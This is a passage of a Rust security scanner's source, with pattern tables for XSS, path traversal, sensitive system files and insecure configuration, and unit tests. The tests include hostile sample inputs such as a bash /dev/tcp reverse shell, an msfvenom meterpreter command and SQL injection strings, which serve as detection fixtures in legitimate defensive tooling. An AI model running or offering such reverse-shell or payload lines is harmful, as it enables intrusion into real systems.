            pattern: "document.write(",
            severity: Severity::High,
            rule_id: "SEC-B29",
            message: "document.write() — potential XSS and performance issues",
            remediation: "Use DOM manipulation methods instead",
        },
        XssPattern {
            pattern: "document.writeln(",
            severity: Severity::High,
            rule_id: "SEC-B29",
            message: "document.writeln() — potential XSS",
            remediation: "Use DOM manipulation methods instead",
        },
        XssPattern {
            pattern: "dangerouslySetInnerHTML",
            severity: Severity::High,
            rule_id: "SEC-B30",
            message: "React dangerouslySetInnerHTML — potential XSS",
            remediation: "Sanitize HTML with DOMPurify before rendering",
        },
        XssPattern {
            pattern: "v-html",
            severity: Severity::High,
            rule_id: "SEC-B30",
            message: "Vue v-html directive — potential XSS",
            remediation: "Sanitize HTML before binding",
        },
        XssPattern {
            pattern: "[innerHTML]",
            severity: Severity::High,
            rule_id: "SEC-B30",
            message: "Angular innerHTML binding — potential XSS",
            remediation: "Use Angular DomSanitizer",
        },
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        if is_comment(trimmed, language) {
            continue;
        }
        for p in PATTERNS {
            if trimmed.contains(p.pattern) {
                out.push(SecurityFinding {
                    severity: p.severity,
                    category: "xss".to_owned(),
                    rule_id: p.rule_id.to_owned(),
                    message: p.message.to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(p.remediation.to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
    }
}

// ── Path traversal scanner ───────────────────────────────────────────────────

/// Detect path traversal and unsafe file access patterns.
fn scan_path_traversal(body: &str, out: &mut Vec<SecurityFinding>) {
    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();

        // Direct path traversal
        if trimmed.contains("../") || trimmed.contains("..\\") {
            // Avoid false positives from relative imports in common languages
            if !trimmed.contains("import ") && !trimmed.contains("require(") && !trimmed.contains("#include") {
                out.push(SecurityFinding {
                    severity: Severity::Medium,
                    category: "path_traversal".to_owned(),
                    rule_id: "SEC-B31".to_owned(),
                    message: "Path traversal pattern (../) — verify input sanitization".to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some("Canonicalize paths and validate they remain within allowed directories".to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }

        // Dangerous path operations with user input
        let path_patterns: &[(&str, &str)] = &[
            ("/etc/passwd", "Access to /etc/passwd — sensitive system file"),
            ("/etc/shadow", "Access to /etc/shadow — password hashes"),
            ("/proc/self", "Access to /proc/self — process information leak"),
        ];
        for (pat, msg) in path_patterns {
            if trimmed.contains(pat) {
                out.push(SecurityFinding {
                    severity: Severity::High,
                    category: "path_traversal".to_owned(),
                    rule_id: "SEC-B32".to_owned(),
                    message: msg.to_string(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some("Validate and sanitize file paths; use allowlists".to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
    }
}

// ── Hardcoded config scanner ─────────────────────────────────────────────────

/// Detect insecure hardcoded configurations.
fn scan_hardcoded_config(body: &str, out: &mut Vec<SecurityFinding>) {
    struct ConfigPattern {
        pattern: &'static str,
        severity: Severity,
        rule_id: &'static str,
        message: &'static str,
        remediation: &'static str,
    }

    static PATTERNS: &[ConfigPattern] = &[
        ConfigPattern {
            pattern: "debug=True",
            severity: Severity::Medium,
            rule_id: "SEC-B33",
            message: "Debug mode enabled — disable in production",
            remediation: "Use environment-specific configuration",
        },
        ConfigPattern {
            pattern: "DEBUG = True",
            severity: Severity::Medium,
            rule_id: "SEC-B33",
            message: "Debug mode enabled — disable in production",
            remediation: "Use environment-specific configuration",
        },
        ConfigPattern {
            pattern: "debug: true",
            severity: Severity::Medium,
            rule_id: "SEC-B33",
            message: "Debug mode enabled — disable in production",
            remediation: "Use environment-specific configuration",
        },
        ConfigPattern {
            pattern: "0.0.0.0",
            severity: Severity::Medium,
            rule_id: "SEC-B34",
            message: "Binding to 0.0.0.0 — exposed to all network interfaces",
            remediation: "Bind to 127.0.0.1 for local access or use a firewall",
        },
        ConfigPattern {
            pattern: "CORS_ALLOW_ALL",
            severity: Severity::High,
            rule_id: "SEC-B35",
            message: "CORS allow-all — any origin can make requests",
            remediation: "Restrict CORS to specific trusted origins",
        },
        ConfigPattern {
            pattern: "Access-Control-Allow-Origin: *",
            severity: Severity::High,
            rule_id: "SEC-B35",
            message: "CORS wildcard origin",
            remediation: "Restrict to specific trusted origins",
        },
        ConfigPattern {
            pattern: "AllowAnyOrigin",
            severity: Severity::High,
            rule_id: "SEC-B35",
            message: "CORS allow any origin",
            remediation: "Restrict to specific trusted origins",
        },
        ConfigPattern {
            pattern: "disable_ssl",
            severity: Severity::High,
            rule_id: "SEC-B36",
            message: "SSL/TLS disabled",
            remediation: "Always use TLS for network communication",
        },
        ConfigPattern {
            pattern: "verify=False",
            severity: Severity::High,
            rule_id: "SEC-B36",
            message: "TLS certificate verification disabled",
            remediation: "Enable certificate verification; use proper CA bundles",
        },
        ConfigPattern {
            pattern: "verify: false",
            severity: Severity::High,
            rule_id: "SEC-B36",
            message: "TLS certificate verification disabled",
            remediation: "Enable certificate verification",
        },
        ConfigPattern {
            pattern: "InsecureSkipVerify",
            severity: Severity::High,
            rule_id: "SEC-B36",
            message: "Go TLS InsecureSkipVerify — MITM vulnerable",
            remediation: "Use proper certificate validation",
        },
        ConfigPattern {
            pattern: "NODE_TLS_REJECT_UNAUTHORIZED",
            severity: Severity::High,
            rule_id: "SEC-B36",
            message: "Node.js TLS verification override",
            remediation: "Do not disable TLS verification in production",
        },
    ];

    for (i, line) in body.lines().enumerate() {
        let trimmed = line.trim();
        if is_comment(trimmed, "") {
            continue;
        }
        for p in PATTERNS {
            if trimmed.contains(p.pattern) {
                out.push(SecurityFinding {
                    severity: p.severity,
                    category: "config".to_owned(),
                    rule_id: p.rule_id.to_owned(),
                    message: p.message.to_owned(),
                    evidence: Some(trimmed.to_owned()),
                    line: Some(i + 1),
                    remediation: Some(p.remediation.to_owned()),
                    word: None,
                    variant: None,
                });
            }
        }
    }
}

// ── Helpers ──────────────────────────────────────────────────────────────────

/// Heuristic: is this line a comment?
fn is_comment(line: &str, _language: &str) -> bool {
    let t = line.trim_start();
    t.starts_with("//")
        || t.starts_with('#')
        || t.starts_with("/*")
        || t.starts_with('*')
        || t.starts_with("--")
        || t.starts_with("rem ")
        || t.starts_with("REM ")
}

/// Check if a line contains a string literal value (not just a variable reference).
fn has_string_literal_value(line: &str) -> bool {
    // Look for quoted strings after = or :
    if let Some(pos) = line.find('=') {
        let after = &line[pos + 1..];
        let trimmed = after.trim();
        if trimmed.starts_with('"') || trimmed.starts_with('\'') {
            // Not empty string
            return trimmed.len() > 2;
        }
    }
    if let Some(pos) = line.find(':') {
        let after = &line[pos + 1..];
        let trimmed = after.trim();
        if trimmed.starts_with('"') || trimmed.starts_with('\'') {
            return trimmed.len() > 2;
        }
    }
    false
}

/// Redact the value part of a secret assignment for safe display.
fn redact_secret(line: &str) -> String {
    let mut result = line.to_owned();
    if result.len() > 80 {
        result.truncate(80);
        result.push_str("...[REDACTED]");
    }
    result
}

// ══════════════════════════════════════════════════════════════════════════════
// Tests
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;
    use nom_ast::Span;
    use nom_resolver::{Resolver, WordEntry};

    fn span() -> Span {
        Span::new(0, 1, 1, 1)
    }

    fn setup() -> Resolver {
        let r = Resolver::open_in_memory().unwrap();
        r.upsert(&WordEntry {
            word: "weak_hash".to_owned(),
            security: 0.2,
            performance: 0.5,
            reliability: 0.9,
            ..WordEntry::default()
        }).unwrap();
        r.upsert(&WordEntry {
            word: "good_hash".to_owned(),
            security: 0.95,
            performance: 0.8,
            reliability: 0.99,
            ..WordEntry::default()
        }).unwrap();
        r.upsert(&WordEntry {
            word: "cve_hash".to_owned(),
            security: 0.9,
            performance: 0.8,
            reliability: 0.99,
            hash: Some("CVE-2024-12345".to_owned()),
            ..WordEntry::default()
        }).unwrap();
        r
    }

    fn make_source_with_need(word: &str) -> SourceFile {
        use nom_ast::*;
        SourceFile {
            path: None,
            locale: None,
            declarations: vec![Declaration {
                classifier: Classifier::Flow,
                name: Identifier::new("test", span()),
                statements: vec![Statement::Need(NeedStmt {
                    reference: NomRef {
                        word: Identifier::new(word, span()),
                        variant: None,
                        span: span(),
                    },
                    constraint: None,
                    span: span(),
                })],
                span: span(),
            }],
        }
    }

    // ── Program-level tests ──────────────────────────────────────────────

    #[test]
    fn passes_for_good_word() {
        let r = setup();
        let checker = SecurityChecker::with_defaults(&r);
        let source = make_source_with_need("good_hash");
        let report = checker.check(&source).unwrap();
        assert!(report.passed);
        assert!(report.findings.is_empty());
    }

    #[test]
    fn fails_for_weak_security() {
        let r = setup();
        let checker = SecurityChecker::with_defaults(&r);
        let source = make_source_with_need("weak_hash");
        let report = checker.check(&source).unwrap();
        assert!(!report.passed);
        assert!(report.findings.iter().any(|f| f.severity >= Severity::High));
    }

    #[test]
    fn detects_cve() {
        let r = setup();
        let checker = SecurityChecker::with_defaults(&r);
        let source = make_source_with_need("cve_hash");
        let report = checker.check(&source).unwrap();
        assert!(report.findings.iter().any(|f| f.severity == Severity::Critical));
    }

    // ── Body scanning tests ─────────────────────────────────────────────

    #[test]
    fn detect_sql_injection() {
        let body = r#"
            let query = "SELECT * FROM users WHERE id=" + user_input;
        "#;
        let findings = scan_body(body, "javascript");
        assert!(
            findings.iter().any(|f| f.category == "injection" && f.severity == Severity::Critical),
            "Should detect SQL injection: {findings:?}"
        );
    }

    #[test]
    fn detect_hardcoded_password() {
        let body = r#"
            password = "super_secret_123"
        "#;
        let findings = scan_body(body, "python");
        assert!(
            findings.iter().any(|f| f.category == "secrets" && f.severity >= Severity::High),
            "Should detect hardcoded password: {findings:?}"
        );
    }

    #[test]
    fn detect_reverse_shell() {
        let body = r#"
            bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
        "#;
        let findings = scan_body(body, "bash");
        assert!(
            findings.iter().any(|f| f.category == "payload" && f.severity == Severity::Critical),
            "Should detect reverse shell: {findings:?}"
        );
    }

    #[test]
    fn detect_weak_crypto_md5() {
        let body = r#"
            import hashlib
            h = hashlib.md5(password.encode())
        "#;
        let findings = scan_body(body, "python");
        assert!(
            findings.iter().any(|f| f.category == "crypto" && f.severity >= Severity::High),
            "Should detect MD5 for password hashing: {findings:?}"
        );
    }

    #[test]
    fn detect_api_key_leak() {
        let body = r#"
            api_key = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
        "#;
        let findings = scan_body(body, "python");
        assert!(
            findings.iter().any(|f| f.category == "secrets"),
            "Should detect GitHub PAT: {findings:?}"
        );
    }

    #[test]
    fn clean_code_no_findings() {
        let body = r#"
            fn add(a: i32, b: i32) -> i32 {
                a + b
            }
        "#;
        let findings = scan_body(body, "rust");
        // Filter out Info-level findings
        let real_findings: Vec<_> = findings.iter().filter(|f| f.severity > Severity::Info).collect();
        assert!(
            real_findings.is_empty(),
            "Clean code should have no findings above Info: {real_findings:?}"
        );
    }

    #[test]
    fn security_score_calculation() {
        // No findings = perfect score
        assert_eq!(security_score(&[]), 1.0);

        // One critical = heavy penalty
        let critical = vec![SecurityFinding {
            severity: Severity::Critical,
            category: "test".to_owned(),
            rule_id: "TEST-001".to_owned(),
            message: "test".to_owned(),
            evidence: None,
            line: None,
            remediation: None,
            word: None,
            variant: None,
        }];
        let score = security_score(&critical);
        assert!(score < 0.7, "Critical finding should reduce score below 0.7, got {score}");
        assert!(score > 0.0, "Single critical should not zero out score");

        // Multiple findings stack
        let multiple = vec![
            SecurityFinding {
                severity: Severity::Critical,
                category: "test".to_owned(),
                rule_id: "TEST-001".to_owned(),
                message: "test".to_owned(),
                evidence: None,
                line: None,
                remediation: None,
                word: None,
                variant: None,
            },
            SecurityFinding {
                severity: Severity::High,
                category: "test".to_owned(),
                rule_id: "TEST-002".to_owned(),
                message: "test".to_owned(),
                evidence: None,
                line: None,
                remediation: None,
                word: None,
                variant: None,
            },
            SecurityFinding {
                severity: Severity::High,
                category: "test".to_owned(),
                rule_id: "TEST-003".to_owned(),
                message: "test".to_owned(),
                evidence: None,
                line: None,
                remediation: None,
                word: None,
                variant: None,
            },
        ];
        let stacked = security_score(&multiple);
        assert!(stacked < score, "More findings should lower score");
    }

    #[test]
    fn severity_ordering() {
        assert!(Severity::Critical > Severity::High);
        assert!(Severity::High > Severity::Medium);
        assert!(Severity::Medium > Severity::Low);
        assert!(Severity::Low > Severity::Info);
    }

    #[test]
    fn detect_pickle_deserialization() {
        let body = "data = pickle.loads(user_input)";
        let findings = scan_body(body, "python");
        assert!(
            findings.iter().any(|f| f.category == "deserialization" && f.severity == Severity::Critical),
            "Should detect pickle.loads: {findings:?}"
        );
    }

    #[test]
    fn detect_xss_innerhtml() {
        let body = r#"element.innerHTML = userInput;"#;
        let findings = scan_body(body, "javascript");
        assert!(
            findings.iter().any(|f| f.category == "xss" && f.severity == Severity::High),
            "Should detect innerHTML XSS: {findings:?}"
        );
    }

    #[test]
    fn detect_insecure_tls() {
        let body = r#"requests.get(url, verify=False)"#;
        let findings = scan_body(body, "python");
        assert!(
            findings.iter().any(|f| f.category == "config" && f.severity == Severity::High),
            "Should detect disabled TLS verification: {findings:?}"
        );
    }

    #[test]
    fn detect_private_key() {
        let body = r#"
            key = "-----BEGIN RSA PRIVATE KEY-----\nMIIEow..."
        "#;
        let findings = scan_body(body, "python");
        assert!(
            findings.iter().any(|f| f.category == "secrets" && f.severity == Severity::Critical),
            "Should detect embedded private key: {findings:?}"
        );
    }

    #[test]
    fn detect_msfvenom_payload() {
        let body = "payload = msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1";
        let findings = scan_body(body, "bash");
        assert!(
            findings.iter().any(|f| f.category == "payload" && f.severity == Severity::Critical),
            "Should detect msfvenom payload: {findings:?}"
        );
    }
}
